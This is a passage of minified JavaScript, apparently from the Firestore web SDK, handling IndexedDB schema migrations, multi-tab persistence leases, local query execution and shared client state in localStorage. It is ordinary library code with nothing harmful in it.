M.waitFor(m)})}(e,o))),s=s.next(()=>{(function(c){c.createObjectStore("clientMetadata",{keyPath:"clientId"})})(e)})),r<5&&i>=5&&(s=s.next(()=>this.ni(o))),r<6&&i>=6&&(s=s.next(()=>(function(c){c.createObjectStore("remoteDocumentGlobal")}(e),this.ri(o)))),r<7&&i>=7&&(s=s.next(()=>this.ii(o))),r<8&&i>=8&&(s=s.next(()=>this.si(e,o))),r<9&&i>=9&&(s=s.next(()=>{(function(c){c.objectStoreNames.contains("remoteDocumentChanges")&&c.deleteObjectStore("remoteDocumentChanges")})(e)})),r<10&&i>=10&&(s=s.next(()=>this.oi(o))),r<11&&i>=11&&(s=s.next(()=>{(function(c){c.createObjectStore("bundles",{keyPath:"bundleId"})})(e),function(c){c.createObjectStore("namedQueries",{keyPath:"name"})}(e)})),r<12&&i>=12&&(s=s.next(()=>{(function(c){let l=c.createObjectStore("documentOverlays",{keyPath:AB});l.createIndex("collectionPathOverlayIndex",MB,{unique:!1}),l.createIndex("collectionGroupOverlayIndex",xB,{unique:!1})})(e)})),r<13&&i>=13&&(s=s.next(()=>function(c){let l=c.createObjectStore("remoteDocumentsV14",{keyPath:yB});l.createIndex("documentKeyIndex",vB),l.createIndex("collectionGroupIndex",_B)}(e)).next(()=>this._i(e,o)).next(()=>e.deleteObjectStore("remoteDocuments"))),r<14&&i>=14&&(s=s.next(()=>this.ai(e,o))),r<15&&i>=15&&(s=s.next(()=>function(c){c.createObjectStore("indexConfiguration",{keyPath:"indexId",autoIncrement:!0}).createIndex("collectionGroupIndex","collectionGroup",{unique:!1}),c.createObjectStore("indexState",{keyPath:CB}).createIndex("sequenceNumberIndex",bB,{unique:!1}),c.createObjectStore("indexEntries",{keyPath:TB}).createIndex("documentKeyIndex",SB,{unique:!1})}(e))),r<16&&i>=16&&(s=s.next(()=>{t.objectStore("indexState").clear()}).next(()=>{t.objectStore("indexEntries").clear()})),r<17&&i>=17&&(s=s.next(()=>{(function(c){c.createObjectStore("globals",{keyPath:"name"})})(e)})),s}ri(e){let t=0;return e.store("remoteDocuments").J((r,i)=>{t+=Vf(i)}).next(()=>{let r={byteSize:t};return e.store("remoteDocumentGlobal").put("remoteDocumentGlobalKey",r)})}ni(e){let t=e.store("mutationQueues"),r=e.store("mutations");return t.U().next(i=>M.forEach(i,o=>{let s=IDBKeyRange.bound([o.userId,-1],[o.userId,o.lastAcknowledgedBatchId]);return r.U("userMutationsIndex",s).next(a=>M.forEach(a,c=>{Q(c.userId===o.userId);let l=co(this.serializer,c);return bx(e,o.userId,l).next(()=>{})}))}))}ii(e){let t=e.store("targetDocuments"),r=e.store("remoteDocuments");return e.store("targetGlobal").get("targetGlobalKey").next(i=>{let o=[];return r.J((s,a)=>{let c=new ve(s),l=function(p){return[0,Vt(p)]}(c);o.push(t.get(l).next(h=>h?M.resolve():(p=>t.put({targetId:0,path:Vt(p),sequenceNumber:i.highestListenSequenceNumber}))(c)))}).next(()=>M.waitFor(o))})}si(e,t){e.createObjectStore("collectionParents",{keyPath:DB});let r=t.store("collectionParents"),i=new Ru,o=s=>{if(i.add(s)){let a=s.lastSegment(),c=s.popLast();return r.put({collectionId:a,parent:Vt(c)})}};return t.store("remoteDocuments").J({H:!0},(s,a)=>{let c=new ve(s);return o(c.popLast())}).next(()=>t.store("documentMutations").J({H:!0},([s,a,c],l)=>{let h=qn(a);return o(h.popLast())}))}oi(e){let t=e.store("targets");return t.J((r,i)=>{let o=hu(i),s=Ix(this.serializer,o);return t.put(s)})}_i(e,t){let r=t.store("remoteDocuments"),i=[];return r.J((o,s)=>{let a=t.store("remoteDocumentsV14"),c=function(p){return p.document?new q(ve.fromString(p.document.name).popFirst(5)):p.noDocument?q.fromSegments(p.noDocument.path):p.unknownDocument?q.fromSegments(p.unknownDocument.path):z()}(s).path.toArray(),l={prefixPath:c.slice(0,c.length-2),collectionGroup:c[c.length-2],documentId:c[c.length-1],readTime:s.readTime||[0,0],unknownDocument:s.unknownDocument,noDocument:s.noDocument,document:s.document,hasCommittedMutations:!!s.hasCommittedMutations};i.push(a.put(l))}).next(()=>M.waitFor(i))}ai(e,t){let r=t.store("mutations"),i=Ax(this.serializer),o=new Bf($f.Zr,this.serializer.ct);return r.U().next(s=>{let a=new Map;return s.forEach(c=>{var l;let h=(l=a.get(c.userId))!==null&&l!==void 0?l:ie();co(this.serializer,c).keys().forEach(p=>h=h.add(p)),a.set(c.userId,h)}),M.forEach(a,(c,l)=>{let h=new st(l),p=kf.lt(this.serializer,h),m=o.getIndexManager(h),y=Lf.lt(h,this.serializer,m,o.referenceDelegate);return new jf(i,y,p,m).recalculateAndSaveOverlaysForDocumentKeys(new wu(t,rn.oe),c).next()})})}};function uM(n){n.createObjectStore("targetDocuments",{keyPath:EB}).createIndex("documentTargetsIndex",IB,{unique:!0}),n.createObjectStore("targets",{keyPath:"targetId"}).createIndex("queryTargetsIndex",wB,{unique:!0}),n.createObjectStore("targetGlobal")}var t_="Failed to obtain exclusive access to the persistence layer. To allow shared access, multi-tab synchronization has to be enabled in all tabs. If you are using `experimentalForceOwningTab:true`, make sure that only one tab has persistence enabled at any given time.",pw=class n{constructor(e,t,r,i,o,s,a,c,l,h,p=17){if(this.allowTabSynchronization=e,this.persistenceKey=t,this.clientId=r,this.ui=o,this.window=s,this.document=a,this.ci=l,this.li=h,this.hi=p,this.Qr=null,this.Kr=!1,this.isPrimary=!1,this.networkEnabled=!0,this.Pi=null,this.inForeground=!1,this.Ii=null,this.Ti=null,this.Ei=Number.NEGATIVE_INFINITY,this.di=m=>Promise.resolve(),!n.D())throw new k(N.UNIMPLEMENTED,"This platform is either missing IndexedDB or is known to have an incomplete implementation. Offline persistence has been disabled.");this.referenceDelegate=new tw(this,i),this.Ai=t+"main",this.serializer=new Nf(c),this.Ri=new _i(this.Ai,this.hi,new fw(this.serializer)),this.$r=new $_,this.Ur=new Z_(this.referenceDelegate,this.serializer),this.remoteDocumentCache=Ax(this.serializer),this.Gr=new B_,this.window&&this.window.localStorage?this.Vi=this.window.localStorage:(this.Vi=null,h===!1&&Ze("IndexedDbPersistence","LocalStorage is unavailable. As a result, persistence may not work reliably. In particular enablePersistence() could fail immediately after refreshing the page."))}start(){return this.mi().then(()=>{if(!this.isPrimary&&!this.allowTabSynchronization)throw new k(N.FAILED_PRECONDITION,t_);return this.fi(),this.gi(),this.pi(),this.runTransaction("getHighestListenSequenceNumber","readonly",e=>this.Ur.getHighestSequenceNumber(e))}).then(e=>{this.Qr=new rn(e,this.ci)}).then(()=>{this.Kr=!0}).catch(e=>(this.Ri&&this.Ri.close(),Promise.reject(e)))}yi(e){return this.di=t=>R(this,null,function*(){if(this.started)return e(t)}),e(this.isPrimary)}setDatabaseDeletedListener(e){this.Ri.L(t=>R(this,null,function*(){t.newVersion===null&&(yield e())}))}setNetworkEnabled(e){this.networkEnabled!==e&&(this.networkEnabled=e,this.ui.enqueueAndForget(()=>R(this,null,function*(){this.started&&(yield this.mi())})))}mi(){return this.runTransaction("updateClientMetadataAndTryBecomePrimary","readwrite",e=>lf(e).put({clientId:this.clientId,updateTimeMs:Date.now(),networkEnabled:this.networkEnabled,inForeground:this.inForeground}).next(()=>{if(this.isPrimary)return this.wi(e).next(t=>{t||(this.isPrimary=!1,this.ui.enqueueRetryable(()=>this.di(!1)))})}).next(()=>this.Si(e)).next(t=>this.isPrimary&&!t?this.bi(e).next(()=>!1):!!t&&this.Di(e).next(()=>!0))).catch(e=>{if(Mi(e))return O("IndexedDbPersistence","Failed to extend owner lease: ",e),this.isPrimary;if(!this.allowTabSynchronization)throw e;return O("IndexedDbPersistence","Releasing owner lease after error during lease refresh",e),!1}).then(e=>{this.isPrimary!==e&&this.ui.enqueueRetryable(()=>this.di(e)),this.isPrimary=e})}wi(e){return lu(e).get("owner").next(t=>M.resolve(this.vi(t)))}Ci(e){return lf(e).delete(this.clientId)}Fi(){return R(this,null,function*(){if(this.isPrimary&&!this.Mi(this.Ei,18e5)){this.Ei=Date.now();let e=yield this.runTransaction("maybeGarbageCollectMultiClientState","readwrite-primary",t=>{let r=dt(t,"clientMetadata");return r.U().next(i=>{let o=this.xi(i,18e5),s=i.filter(a=>o.indexOf(a)===-1);return M.forEach(s,a=>r.delete(a.clientId)).next(()=>s)})}).catch(()=>[]);if(this.Vi)for(let t of e)this.Vi.removeItem(this.Oi(t.clientId))}})}pi(){this.Ti=this.ui.enqueueAfterDelay("client_metadata_refresh",4e3,()=>this.mi().then(()=>this.Fi()).then(()=>this.pi()))}vi(e){return!!e&&e.ownerId===this.clientId}Si(e){return this.li?M.resolve(!0):lu(e).get("owner").next(t=>{if(t!==null&&this.Mi(t.leaseTimestampMs,5e3)&&!this.Ni(t.ownerId)){if(this.vi(t)&&this.networkEnabled)return!0;if(!this.vi(t)){if(!t.allowTabSynchronization)throw new k(N.FAILED_PRECONDITION,t_);return!1}}return!(!this.networkEnabled||!this.inForeground)||lf(e).U().next(r=>this.xi(r,5e3).find(i=>{if(this.clientId!==i.clientId){let o=!this.networkEnabled&&i.networkEnabled,s=!this.inForeground&&i.inForeground,a=this.networkEnabled===i.networkEnabled;if(o||s&&a)return!0}return!1})===void 0)}).next(t=>(this.isPrimary!==t&&O("IndexedDbPersistence",`Client ${t?"is":"is not"} eligible for a primary lease.`),t))}shutdown(){return R(this,null,function*(){this.Kr=!1,this.Li(),this.Ti&&(this.Ti.cancel(),this.Ti=null),this.Bi(),this.ki(),yield this.Ri.runTransaction("shutdown","readwrite",["owner","clientMetadata"],e=>{let t=new wu(e,rn.oe);return this.bi(t).next(()=>this.Ci(t))}),this.Ri.close(),this.qi()})}xi(e,t){return e.filter(r=>this.Mi(r.updateTimeMs,t)&&!this.Ni(r.clientId))}Qi(){return this.runTransaction("getActiveClients","readonly",e=>lf(e).U().next(t=>this.xi(t,18e5).map(r=>r.clientId)))}get started(){return this.Kr}getGlobalsCache(){return this.$r}getMutationQueue(e,t){return Lf.lt(e,this.serializer,t,this.referenceDelegate)}getTargetCache(){return this.Ur}getRemoteDocumentCache(){return this.remoteDocumentCache}getIndexManager(e){return new Y_(e,this.serializer.ct.databaseId)}getDocumentOverlayCache(e){return kf.lt(this.serializer,e)}getBundleCache(){return this.Gr}runTransaction(e,t,r){O("IndexedDbPersistence","Starting transaction:",e);let i=t==="readonly"?"readonly":"readwrite",o=function(c){return c===17?PB:c===16?NB:c===15?aE:c===14?OM:c===13?kM:c===12?RB:c===11?PM:void z()}(this.hi),s;return this.Ri.runTransaction(e,i,o,a=>(s=new wu(a,this.Qr?this.Qr.next():rn.oe),t==="readwrite-primary"?this.wi(s).next(c=>!!c||this.Si(s)).next(c=>{if(!c)throw Ze(`Failed to obtain primary lease for action '${e}'.`),this.isPrimary=!1,this.ui.enqueueRetryable(()=>this.di(!1)),new k(N.FAILED_PRECONDITION,MM);return r(s)}).next(c=>this.Di(s).next(()=>c)):this.Ki(s).next(()=>r(s)))).then(a=>(s.raiseOnCommittedEvent(),a))}Ki(e){return lu(e).get("owner").next(t=>{if(t!==null&&this.Mi(t.leaseTimestampMs,5e3)&&!this.Ni(t.ownerId)&&!this.vi(t)&&!(this.li||this.allowTabSynchronization&&t.allowTabSynchronization))throw new k(N.FAILED_PRECONDITION,t_)})}Di(e){let t={ownerId:this.clientId,allowTabSynchronization:this.allowTabSynchronization,leaseTimestampMs:Date.now()};return lu(e).put("owner",t)}static D(){return _i.D()}bi(e){let t=lu(e);return t.get("owner").next(r=>this.vi(r)?(O("IndexedDbPersistence","Releasing primary lease."),t.delete("owner")):M.resolve())}Mi(e,t){let r=Date.now();return!(e<r-t)&&(!(e>r)||(Ze(`Detected an update time that is in the future: ${e} > ${r}`),!1))}fi(){this.document!==null&&typeof this.document.addEventListener=="function"&&(this.Ii=()=>{this.ui.enqueueAndForget(()=>(this.inForeground=this.document.visibilityState==="visible",this.mi()))},this.document.addEventListener("visibilitychange",this.Ii),this.inForeground=this.document.visibilityState==="visible")}Bi(){this.Ii&&(this.document.removeEventListener("visibilitychange",this.Ii),this.Ii=null)}gi(){var e;typeof((e=this.window)===null||e===void 0?void 0:e.addEventListener)=="function"&&(this.Pi=()=>{this.Li();let t=/(?:Version|Mobile)\/1[456]/;ig()&&(navigator.appVersion.match(t)||navigator.userAgent.match(t))&&this.ui.enterRestrictedMode(!0),this.ui.enqueueAndForget(()=>this.shutdown())},this.window.addEventListener("pagehide",this.Pi))}ki(){this.Pi&&(this.window.removeEventListener("pagehide",this.Pi),this.Pi=null)}Ni(e){var t;try{let r=((t=this.Vi)===null||t===void 0?void 0:t.getItem(this.Oi(e)))!==null;return O("IndexedDbPersistence",`Client '${e}' ${r?"is":"is not"} zombied in LocalStorage`),r}catch(r){return Ze("IndexedDbPersistence","Failed to get zombied client id.",r),!1}}Li(){if(this.Vi)try{this.Vi.setItem(this.Oi(this.clientId),String(Date.now()))}catch(e){Ze("Failed to set zombie client id.",e)}}qi(){if(this.Vi)try{this.Vi.removeItem(this.Oi(this.clientId))}catch{}}Oi(e){return`firestore_zombie_${this.persistenceKey}_${e}`}};function lu(n){return dt(n,"owner")}function lf(n){return dt(n,"clientMetadata")}function mE(n,e){let t=n.projectId;return n.isDefaultDatabase||(t+="."+n.database),"firestore/"+e+"/"+t+"/"}var gw=class n{constructor(e,t,r,i){this.targetId=e,this.fromCache=t,this.$i=r,this.Ui=i}static Wi(e,t){let r=ie(),i=ie();for(let o of t.docChanges)switch(o.type){case 0:r=r.add(o.doc.key);break;case 1:i=i.add(o.doc.key)}return new n(e,t.fromCache,r,i)}};var mw=class{constructor(){this._documentReadCount=0}get documentReadCount(){return this._documentReadCount}incrementDocumentReadCount(e){this._documentReadCount+=e}};var Hf=class{constructor(){this.Gi=!1,this.zi=!1,this.ji=100,this.Hi=function(){return ig()?8:xM(za())>0?6:4}()}initialize(e,t){this.Ji=e,this.indexManager=t,this.Gi=!0}getDocumentsMatchingQuery(e,t,r,i){let o={result:null};return this.Yi(e,t).next(s=>{o.result=s}).next(()=>{if(!o.result)return this.Zi(e,t,i,r).next(s=>{o.result=s})}).next(()=>{if(o.result)return;let s=new mw;return this.Xi(e,t,s).next(a=>{if(o.result=a,this.zi)return this.es(e,t,s,a.size)})}).next(()=>o.result)}es(e,t,r,i){return r.documentReadCount<this.ji?(qs()<=kn.DEBUG&&O("QueryEngine","SDK will not create cache indexes for query:",zs(t),"since it only creates cache indexes for collection contains","more than or equal to",this.ji,"documents"),M.resolve()):(qs()<=kn.DEBUG&&O("QueryEngine","Query:",zs(t),"scans",r.documentReadCount,"local documents and returns",i,"documents as results."),r.documentReadCount>this.Hi*i?(qs()<=kn.DEBUG&&O("QueryEngine","The SDK decides to create cache indexes for query:",zs(t),"as using cache indexes may help improve performance."),this.indexManager.createTargetIndexes(e,Lt(t))):M.resolve())}Yi(e,t){if(FA(t))return M.resolve(null);let r=Lt(t);return this.indexManager.getIndexType(e,r).next(i=>i===0?null:(t.limit!==null&&i===1&&(t=Af(t,null,"F"),r=Lt(t)),this.indexManager.getDocumentsMatchingTarget(e,r).next(o=>{let s=ie(...o);return this.Ji.getDocuments(e,s).next(a=>this.indexManager.getMinOffset(e,r).next(c=>{let l=this.ts(t,a);return this.ns(t,l,s,c.readTime)?this.Yi(e,Af(t,null,"F")):this.rs(e,l,t,c)}))})))}Zi(e,t,r,i){return FA(t)||i.isEqual(ee.min())?M.resolve(null):this.Ji.getDocuments(e,r).next(o=>{let s=this.ts(t,o);return this.ns(t,s,r,i)?M.resolve(null):(qs()<=kn.DEBUG&&O("QueryEngine","Re-using previous result from %s to execute query: %s",i.toString(),zs(t)),this.rs(e,s,t,SM(i,-1)).next(a=>a))})}ts(e,t){let r=new Re(QM(e));return t.forEach((i,o)=>{$u(e,o)&&(r=r.add(o))}),r}ns(e,t,r,i){if(e.limit===null)return!1;if(r.size!==t.size)return!0;let o=e.limitType==="F"?t.last():t.first();return!!o&&(o.hasPendingWrites||o.version.compareTo(i)>0)}Xi(e,t,r){return qs()<=kn.DEBUG&&O("QueryEngine","Using full collection scan to execute query:",zs(t)),this.Ji.getDocumentsMatchingQuery(e,t,mn.min(),r)}rs(e,t,r,i){return this.Ji.getDocumentsMatchingQuery(e,r,i).next(o=>(t.forEach(s=>{o=o.insert(s.key,s)}),o))}};var yw=class{constructor(e,t,r,i){this.persistence=e,this.ss=t,this.serializer=i,this.os=new Fe(re),this._s=new Zn(o=>yo(o),ju),this.us=new Map,this.cs=e.getRemoteDocumentCache(),this.Ur=e.getTargetCache(),this.Gr=e.getBundleCache(),this.ls(r)}ls(e){this.documentOverlayCache=this.persistence.getDocumentOverlayCache(e),this.indexManager=this.persistence.getIndexManager(e),this.mutationQueue=this.persistence.getMutationQueue(e,this.indexManager),this.localDocuments=new jf(this.cs,this.mutationQueue,this.documentOverlayCache,this.indexManager),this.cs.setIndexManager(this.indexManager),this.ss.initialize(this.localDocuments,this.indexManager)}collectGarbage(e){return this.persistence.runTransaction("Collect garbage","readwrite-primary",t=>e.collect(t,this.os))}};function Mx(n,e,t,r){return new yw(n,e,t,r)}function xx(n,e){return R(this,null,function*(){let t=H(n);return yield t.persistence.runTransaction("Handle user change","readonly",r=>{let i;return t.mutationQueue.getAllMutationBatches(r).next(o=>(i=o,t.ls(e),t.mutationQueue.getAllMutationBatches(r))).next(o=>{let s=[],a=[],c=ie();for(let l of i){s.push(l.batchId);for(let h of l.mutations)c=c.add(h.key)}for(let l of o){a.push(l.batchId);for(let h of l.mutations)c=c.add(h.key)}return t.localDocuments.getDocuments(r,c).next(l=>({hs:l,removedBatchIds:s,addedBatchIds:a}))})})})}function h$(n,e){let t=H(n);return t.persistence.runTransaction("Acknowledge batch","readwrite-primary",r=>{let i=e.batch.keys(),o=t.cs.newChangeBuffer({trackRemovals:!0});return function(a,c,l,h){let p=l.batch,m=p.keys(),y=M.resolve();return m.forEach(D=>{y=y.next(()=>h.getEntry(c,D)).next(b=>{let T=l.docVersions.get(D);Q(T!==null),b.version.compareTo(T)<0&&(p.applyToRemoteDocument(b,l),b.isValidDocument()&&(b.setReadTime(l.commitVersion),h.addEntry(b)))})}),y.next(()=>a.mutationQueue.removeMutationBatch(c,p))}(t,r,e,o).next(()=>o.apply(r)).next(()=>t.mutationQueue.performConsistencyCheck(r)).next(()=>t.documentOverlayCache.removeOverlaysForBatchId(r,i,e.batch.batchId)).next(()=>t.localDocuments.recalculateAndSaveOverlaysForDocumentKeys(r,function(a){let c=ie();for(let l=0;l<a.mutationResults.length;++l)a.mutationResults[l].transformResults.length>0&&(c=c.add(a.batch.mutations[l].key));return c}(e))).next(()=>t.localDocuments.getDocuments(r,i))})}function Rx(n){let e=H(n);return e.persistence.runTransaction("Get last remote snapshot version","readonly",t=>e.Ur.getLastRemoteSnapshotVersion(t))}function f$(n,e){let t=H(n),r=e.snapshotVersion,i=t.os;return t.persistence.runTransaction("Apply remote event","readwrite-primary",o=>{let s=t.cs.newChangeBuffer({trackRemovals:!0});i=t.os;let a=[];e.targetChanges.forEach((h,p)=>{let m=i.get(p);if(!m)return;a.push(t.Ur.removeMatchingKeys(o,h.removedDocuments,p).next(()=>t.Ur.addMatchingKeys(o,h.addedDocuments,p)));let y=m.withSequenceNumber(o.currentSequenceNumber);e.targetMismatches.get(p)!==null?y=y.withResumeToken(et.EMPTY_BYTE_STRING,ee.min()).withLastLimboFreeSnapshotVersion(ee.min()):h.resumeToken.approximateByteSize()>0&&(y=y.withResumeToken(h.resumeToken,r)),i=i.insert(p,y),function(b,T,F){return b.resumeToken.approximateByteSize()===0||T.snapshotVersion.toMicroseconds()-b.snapshotVersion.toMicroseconds()>=3e8?!0:F.addedDocuments.size+F.modifiedDocuments.size+F.removedDocuments.size>0}(m,y,h)&&a.push(t.Ur.updateTargetData(o,y))});let c=Wt(),l=ie();if(e.documentUpdates.forEach(h=>{e.resolvedLimboDocuments.has(h)&&a.push(t.persistence.referenceDelegate.updateLimboDocument(o,h))}),a.push(Nx(o,s,e.documentUpdates).next(h=>{c=h.Ps,l=h.Is})),!r.isEqual(ee.min())){let h=t.Ur.getLastRemoteSnapshotVersion(o).next(p=>t.Ur.setTargetsMetadata(o,o.currentSequenceNumber,r));a.push(h)}return M.waitFor(a).next(()=>s.apply(o)).next(()=>t.localDocuments.getLocalViewOfDocuments(o,c,l)).next(()=>c)}).then(o=>(t.os=i,o))}function Nx(n,e,t){let r=ie(),i=ie();return t.forEach(o=>r=r.add(o)),e.getEntries(n,r).next(o=>{let s=Wt();return t.forEach((a,c)=>{let l=o.get(a);c.isFoundDocument()!==l.isFoundDocument()&&(i=i.add(a)),c.isNoDocument()&&c.version.isEqual(ee.min())?(e.removeEntry(a,c.readTime),s=s.insert(a,c)):!l.isValidDocument()||c.version.compareTo(l.version)>0||c.version.compareTo(l.version)===0&&l.hasPendingWrites?(e.addEntry(c),s=s.insert(a,c)):O("LocalStore","Ignoring outdated watch update for ",a,". Current version:",l.version," Watch version:",c.version)}),{Ps:s,Is:i}})}function p$(n,e){let t=H(n);return t.persistence.runTransaction("Get next mutation batch","readonly",r=>(e===void 0&&(e=-1),t.mutationQueue.getNextMutationBatchAfterBatchId(r,e)))}function ca(n,e){let t=H(n);return t.persistence.runTransaction("Allocate target","readwrite",r=>{let i;return t.Ur.getTargetData(r,e).next(o=>o?(i=o,M.resolve(i)):t.Ur.allocateTargetId(r).next(s=>(i=new sa(e,s,"TargetPurposeListen",r.currentSequenceNumber),t.Ur.addTargetData(r,i).next(()=>i))))}).then(r=>{let i=t.os.get(r.targetId);return(i===null||r.snapshotVersion.compareTo(i.snapshotVersion)>0)&&(t.os=t.os.insert(r.targetId,r),t._s.set(e,r.targetId)),r})}function ua(n,e,t){return R(this,null,function*(){let r=H(n),i=r.os.get(e),o=t?"readwrite":"readwrite-primary";try{t||(yield r.persistence.runTransaction("Release target",o,s=>r.persistence.referenceDelegate.removeTarget(s,i)))}catch(s){if(!Mi(s))throw s;O("LocalStore",`Failed to update sequence numbers for target ${e}: ${s}`)}r.os=r.os.remove(e),r._s.delete(i.target)})}function qf(n,e,t){let r=H(n),i=ee.min(),o=ie();return r.persistence.runTransaction("Execute query","readwrite",s=>function(c,l,h){let p=H(c),m=p._s.get(h);return m!==void 0?M.resolve(p.os.get(m)):p.Ur.getTargetData(l,h)}(r,s,Lt(e)).next(a=>{if(a)return i=a.lastLimboFreeSnapshotVersion,r.Ur.getMatchingKeysForTargetId(s,a.targetId).next(c=>{o=c})}).next(()=>r.ss.getDocumentsMatchingQuery(s,e,t?i:ee.min(),t?o:ie())).next(a=>(Ox(r,KM(e),a),{documents:a,Ts:o})))}function Px(n,e){let t=H(n),r=H(t.Ur),i=t.os.get(e);return i?Promise.resolve(i.target):t.persistence.runTransaction("Get target data","readonly",o=>r.ot(o,e).next(s=>s?s.target:null))}function kx(n,e){let t=H(n),r=t.us.get(e)||ee.min();return t.persistence.runTransaction("Get new document changes","readonly",i=>t.cs.getAllFromCollectionGroup(i,e,SM(r,-1),Number.MAX_SAFE_INTEGER)).then(i=>(Ox(t,e,i),i))}function Ox(n,e,t){let r=n.us.get(e)||ee.min();t.forEach((i,o)=>{o.readTime.compareTo(r)>0&&(r=o.readTime)}),n.us.set(e,r)}function g$(n,e,t,r){return R(this,null,function*(){let i=H(n),o=ie(),s=Wt();for(let l of t){let h=e.Es(l.metadata.name);l.document&&(o=o.add(h));let p=e.ds(l);p.setReadTime(e.As(l.metadata.readTime)),s=s.insert(h,p)}let a=i.cs.newChangeBuffer({trackRemovals:!0}),c=yield ca(i,function(h){return Lt(ya(ve.fromString(`__bundle__/docs/${h}`)))}(r));return i.persistence.runTransaction("Apply bundle documents","readwrite",l=>Nx(l,a,s).next(h=>(a.apply(l),h)).next(h=>i.Ur.removeMatchingKeysForTargetId(l,c.targetId).next(()=>i.Ur.addMatchingKeys(l,o,c.targetId)).next(()=>i.localDocuments.getLocalViewOfDocuments(l,h.Ps,h.Is)).next(()=>h.Ps)))})}function m$(r,i){return R(this,arguments,function*(n,e,t=ie()){let o=yield ca(n,Lt(pE(e.bundledQuery))),s=H(n);return s.persistence.runTransaction("Save named query","readwrite",a=>{let c=Xe(e.readTime);if(o.snapshotVersion.compareTo(c)>=0)return s.Gr.saveNamedQuery(a,e);let l=o.withResumeToken(et.EMPTY_BYTE_STRING,c);return s.os=s.os.insert(l.targetId,l),s.Ur.updateTargetData(a,l).next(()=>s.Ur.removeMatchingKeysForTargetId(a,o.targetId)).next(()=>s.Ur.addMatchingKeys(a,t,o.targetId)).next(()=>s.Gr.saveNamedQuery(a,e))})})}function lM(n,e){return`firestore_clients_${n}_${e}`}function dM(n,e,t){let r=`firestore_mutations_${n}_${t}`;return e.isAuthenticated()&&(r+=`_${e.uid}`),r}function n_(n,e){return`firestore_targets_${n}_${e}`}var zf=class n{constructor(e,t,r,i){this.user=e,this.batchId=t,this.state=r,this.error=i}static Rs(e,t,r){let i=JSON.parse(r),o,s=typeof i=="object"&&["pending","acknowledged","rejected"].indexOf(i.state)!==-1&&(i.error===void 0||typeof i.error=="object");return s&&i.error&&(s=typeof i.error.message=="string"&&typeof i.error.code=="string",s&&(o=new k(i.error.code,i.error.message))),s?new n(e,t,i.state,o):(Ze("SharedClientState",`Failed to parse mutation state for ID '${t}': ${r}`),null)}Vs(){let e={state:this.state,updateTimeMs:Date.now()};return this.error&&(e.error={code:this.error.code,message:this.error.message}),JSON.stringify(e)}},mu=class n{constructor(e,t,r){this.targetId=e,this.state=t,this.error=r}static Rs(e,t){let r=JSON.parse(t),i,o=typeof r=="object"&&["not-current","current","rejected"].indexOf(r.state)!==-1&&(r.error===void 0||typeof r.error=="object");return o&&r.error&&(o=typeof r.error.message=="string"&&typeof r.error.code=="string",o&&(i=new k(r.error.code,r.error.message))),o?new n(e,r.state,i):(Ze("SharedClientState",`Failed to parse target state for ID '${e}': ${t}`),null)}Vs(){let e={state:this.state,updateTimeMs:Date.now()};return this.error&&(e.error={code:this.error.code,message:this.error.message}),JSON.stringify(e)}},Gf=class n{constructor(e,t){this.clientId=e,this.activeTargetIds=t}static Rs(e,t){let r=JSON.parse(t),i=typeof r=="object"&&r.activeTargetIds instanceof Array,o=dE();for(let s=0;i&&s<r.activeTargetIds.length;++s)i=RM(r.activeTargetIds[s]),o=o.add(r.activeTargetIds[s]);return i?new n(e,o):(Ze("SharedClientState",`Failed to parse client data for instance '${e}': ${t}`),null)}},vw=class n{constructor(e,t){this.clientId=e,this.onlineState=t}static Rs(e){let t=JSON.parse(e);return typeof t=="object"&&["Unknown","Online","Offline"].indexOf(t.onlineState)!==-1&&typeof t.clientId=="string"?new n(t.clientId,t.onlineState):(Ze("SharedClientState",`Failed to parse online state: ${e}`),null)}},Pu=class{constructor(){this.activeTargetIds=dE()}fs(e){this.activeTargetIds=this.activeTargetIds.add(e)}gs(e){this.activeTargetIds=this.activeTargetIds.delete(e)}Vs(){let e={activeTargetIds:this.activeTargetIds.toArray(),updateTimeMs:Date.now()};return JSON.stringify(e)}},yu=class{constructor(e,t,r,i,o){this.window=e,this.ui=t,this.persistenceKey=r,this.ps=i,this.syncEngine=null,this.onlineStateHandler=null,this.sequenceNumberHandler=null,this.ys=this.ws.bind(this),this.Ss=new Fe(re),this.started=!1,this.bs=[];let s=r.replace(/[.*+?^${}()|[\]\\]/g,"\\$&");this.storage=this.window.localStorage,this.currentUser=o,this.Ds=lM(this.persistenceKey,this.ps),this.vs=function(c){return`firestore_sequence_number_${c}`}(this.persistenceKey),this.Ss=this.Ss.insert(this.ps,new Pu),this.Cs=new RegExp(`^firestore_clients_${s}_([^_]*)$`),this.Fs=new RegExp(`^firestore_mutations_${s}_(\\d+)(?:_(.*))?$`),this.Ms=new RegExp(`^firestore_targets_${s}_(\\d+)$`),this.xs=function(c){return`firestore_online_state_${c}`}(this.persistenceKey),this.Os=function(c){return`firestore_bundle_loaded_v2_${c}`}(this.persistenceKey),this.window.addEventListener("storage",this.ys)}static D(e){return!(!e||!e.localStorage)}start(){return R(this,null,function*(){let e=yield this.syncEngine.Qi();for(let r of e){if(r===this.ps)continue;let i=this.getItem(lM(this.persistenceKey,r));if(i){let o=Gf.Rs(r,i);o&&(this.Ss=this.Ss.insert(o.clientId,o))}}this.Ns();let t=this.storage.getItem(this.xs);if(t){let r=this.Ls(t);r&&this.Bs(r)}for(let r of this.bs)this.ws(r);this.bs=[],this.window.addEventListener("pagehide",()=>this.shutdown()),this.started=!0})}writeSequenceNumber(e){this.setItem(this.vs,JSON.stringify(e))}getAllActiveQueryTargets(){return this.ks(this.Ss)}isActiveQueryTarget(e){let t=!1;return this.Ss.forEach((r,i)=>{i.activeTargetIds.has(e)&&(t=!0)}),t}addPendingMutation(e){this.qs(e,"pending")}updateMutationState(e,t,r){this.qs(e,t,r),this.Qs(e)}addLocalQueryTarget(e,t=!0){let r="not-current";if(this.isActiveQueryTarget(e)){let i=this.storage.getItem(n_(this.persistenceKey,e));if(i){let o=mu.Rs(e,i);o&&(r=o.state)}}return t&&this.Ks.fs(e),this.Ns(),r}removeLocalQueryTarget(e){this.Ks.gs(e),this.Ns()}isLocalQueryTarget(e){return this.Ks.activeTargetIds.has(e)}clearQueryState(e){this.removeItem(n_(this.persistenceKey,e))}updateQueryState(e,t,r){this.$s(e,t,r)}handleUserChange(e,t,r){t.forEach(i=>{this.Qs(i)}),this.currentUser=e,r.forEach(i=>{this.addPendingMutation(i)})}setOnlineState(e){this.Us(e)}notifyBundleLoaded(e){this.Ws(e)}shutdown(){this.started&&(this.window.removeEventListener("storage",this.ys),this.removeItem(this.Ds),this.started=!1)}getItem(e){let t=this.storage.getItem(e);return 